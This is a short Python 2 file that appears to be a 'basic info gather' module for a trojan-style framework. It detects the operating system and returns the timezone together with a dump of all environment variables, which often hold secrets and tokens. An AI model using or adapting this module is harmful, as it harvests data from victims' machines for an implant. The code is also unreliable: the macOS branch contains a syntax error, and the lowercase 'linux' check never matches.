import os
import platform
import time

def run(**args):
    print "[*] In basic info gather module."
    info = ""
    print platform.system()
    
    if platform.system() == "linux" or platform.system() == "linux2":
        print ("Its linux") #LINUX
        info = "Linux \n"
        info += str("Timezone: %s \n" % time.tzname)
        info += str(os.environ)
    elif platform.system() == "darwin" or platform.system() == "Darwin":
        print ("It's OSX") #OSX
        info = "OSX \n"
        info += str("Timezone: %s \n" ,(%time.tzname))
        info += str(os.environ)
    elif platform.system() == "win32" or platform.system() == "Windows":
        print ("It's Windows") # Windows
        info = "Windows \n"
        info += str("Timezone: %s \n" % time.tzname)
        info += str(os.environ)
    return str(info)



